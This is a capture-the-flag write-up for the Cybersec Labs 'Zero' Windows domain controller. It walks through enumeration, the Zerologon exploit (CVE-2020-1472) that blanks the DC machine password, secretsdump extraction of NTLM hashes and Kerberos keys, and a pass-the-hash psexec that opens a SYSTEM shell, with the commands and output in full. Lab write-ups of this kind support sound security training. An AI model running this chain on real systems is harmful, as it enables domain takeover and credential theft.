# Cybersec Labs-Zero

## NMAP

```
Nmap scan report for 172.31.1.29                                                                                                            
Host is up (0.23s latency).                                                                                                                         
Not shown: 988 filtered ports                                                                                                                       
PORT     STATE SERVICE       VERSION
53/tcp   open  domain?                                                    
| fingerprint-strings: 
|   DNSVersionBindReqTCP: 
|     version                                                                                                                                       
|_    bind            
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2020-11-06 11:37:36Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: Zero.csl0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0                                                                                    
636/tcp  open  tcpwrapped                                                 
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: Zero.csl0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: ZERO
|   NetBIOS_Domain_Name: ZERO
|   NetBIOS_Computer_Name: ZERO-DC
|   DNS_Domain_Name: Zero.csl
|   DNS_Computer_Name: Zero-DC.Zero.csl
|   Product_Version: 10.0.17763
|_  System_Time: 2020-11-06T11:39:59+00:00
| ssl-cert: Subject: commonName=Zero-DC.Zero.csl
| Not valid before: 2020-10-27T06:43:26
|_Not valid after:  2021-04-28T06:43:26
|_ssl-date: 2020-11-06T11:40:38+00:00; -1s from scanner time.
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/
submit.cgi?new-service :
SF-Port53-TCP:V=7.80%I=7%D=11/6%Time=5FA53585%P=x86_64-pc-linux-gnu%r(DNSV 
SF:ersionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\ 
SF:x04bind\0\0\x10\0\x03");
Service Info: Host: ZERO-DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_nbstat: NetBIOS name: ZERO-DC, NetBIOS user: <unknown>, NetBIOS MAC: 0a:ab:c6:2e:5d:b6 (unknown)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2020-11-06T11:39:59
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 324.74 seconds

```

## PORT 139/445 (SMB Shares)

```
root@kali:~/Cybersec Labs/Easy/Zero# smbclient -L \\\\172.31.1.29\\
Enter WORKGROUP\root's password: 
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
SMB1 disabled -- no workgroup available
root@kali:~/Cybersec Labs/Easy/Zero# smbmap -H 172.31.1.29
[+] IP: 172.31.1.29:445 Name: 172.31.1.29                                       
root@kali:~/Cybersec Labs/Easy/Zero# 

```

Found no shares on the box


## PORT 88 (Kerberos)

```
root@kali:~/Cybersec Labs/Easy/Zero# nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='ZERO'" 172.31.1.29
Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-06 16:48 PKT
Stats: 0:00:00 elapsed; 0 hosts completed (0 up), 1 undergoing Ping Scan
Ping Scan Timing: About 100.00% done; ETC: 16:49 (0:00:00 remaining)
Nmap scan report for 172.31.1.29
Host is up (0.22s latency).

PORT   STATE SERVICE
88/tcp open  kerberos-sec
| krb5-enum-users: 
| Discovered Kerberos principals
|_    administrator@ZERO

Nmap done: 1 IP address (1 host up) scanned in 2.14 seconds
root@kali:~/Cybersec Labs/Easy/Zero# 
```
## Zero Logon

Lets try to check if this is vulnerable to `Zero Logon` exploit to do that first make sure to have latest version of `impacket`


```
python3 -m pip install virtualenv
python3 -m virtualenv impkt
source impkt/bin/activate
pip install git+https://github.com/SecureAuthCorp/impacket
```

Have the exploit on you system 

https://github.com/dirkjanm/CVE-2020-1472


<img src="https://imgur.com/qL60xG2.png"/>

```
(impkt) root@kali:/opt/Active Directory/Zero Logon/CVE-2020-1472# python3 cve-2020-1472-exploit.py ZERO-DC 172.31.1.29
Performing authentication attempts...
====================================================================================================================================================
====================================================================================================================================================
=======================
Target vulnerable, changing account password to empty string

Result: 0

```

We have now changed the domain controller's password to an empty string

<img src="https://imgur.com/3eJO3e6.png"/>

### Secretsdump.py

Now run `secretsdump.py` I used `locate secretsdump.py` to find where was the python file and then specify to attack on domain controller with no password and providing hostname `zero` and domain controller `Zero-DC$` with IP `172.31.1.29` 
```
/usr/share/doc/python3-impacket/examples/secretsdump.py  -just-dc -no-pass zero/'Zero-DC$'@172.31.1.29
Impacket v0.9.22.dev1+20201105.154342.d7ed8dba - Copyright 2020 SecureAuth Corporation

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:36242e2cb0b26d16fafd267f39ccf990:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:a190af9837b4381407a3b689e0c839cf:::
jared:1104:aad3b435b51404eeaad3b435b51404ee:36242e2cb0b26d16fafd267f39ccf990:::
ZERO-DC$:1000:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:1bf898538a3b6eeb9b89cf68995e5463053a979f1a898138d39315685c978e96
Administrator:aes128-cts-hmac-sha1-96:a938e7b92eb1348102d819e12ce42637
Administrator:des-cbc-md5:b9f8f4aba129fd37
krbtgt:aes256-cts-hmac-sha1-96:5668dbe3fa1b0d62052045f6d87e37189746f11d05df8c59c1b107ca524883f1
krbtgt:aes128-cts-hmac-sha1-96:fea193d0c59da8e5bbaee22020394fdc
krbtgt:des-cbc-md5:92611373c257c71f
jared:aes256-cts-hmac-sha1-96:1ba68250e533e74ad85cc920f1c827cb9766a6d335a79f7764ce4439cce7f252
jared:aes128-cts-hmac-sha1-96:8946e418c70e2c8669f795a094c99f9e
jared:des-cbc-md5:f8438fc1a4e3162a
ZERO-DC$:aes256-cts-hmac-sha1-96:458cb41c4271c035ae1a9188a4262f00e9dbf94cafc9f5725061d27685eabca4
ZERO-DC$:aes128-cts-hmac-sha1-96:ab9cc7c32dfef381832477eb1ce0cb29
ZERO-DC$:des-cbc-md5:e6efc7387cbcb070
[*] Cleaning up... 
```

Now we know the hash of `Administrator` which is `aad3b435b51404eeaad3b435b51404ee:36242e2cb0b26d16fafd267f39ccf990`

### Psexec.py

Again I used the locate command to find where was the python file and then specify `-hashes` to provide the whole NTLM hash of adminstrator then specifying username@ip_of_dc
```
(impkt) root@kali:/opt/Active Directory/Zero Logon/CVE-2020-1472# /usr/share/doc/python3-impacket/examples/psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:36242e2cb0b26d16fafd267f39ccf990  Administrator@172.31.1.29

Impacket v0.9.22.dev1+20201105.154342.d7ed8dba - Copyright 2020 SecureAuth Corporation

[*] Requesting shares on 172.31.1.29.....
[*] Found writable share ADMIN$
[*] Uploading file MavsPlVx.exe
[*] Opening SVCManager on 172.31.1.29.....
[*] Creating service Ofbt on 172.31.1.29.....
[*] Starting service Ofbt.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.737]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

<img src="https://imgur.com/rKGN5Fr.png"/>